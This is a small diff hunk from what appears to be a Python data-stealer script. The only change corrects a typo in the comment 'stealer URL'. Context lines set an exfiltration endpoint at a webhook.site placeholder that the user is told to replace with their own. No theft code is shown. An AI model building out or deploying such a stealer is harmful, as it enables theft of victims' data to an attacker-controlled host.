@@ -3,7 +3,7 @@ import subprocess, os, sys, requests
 import xml.etree.ElementTree as ET
 
 
-#steaeler URL
+#stealer URL
 url = 'https://webhook.site/your-key/' #replace this with your webhook url
 
 #Lists & Dicts
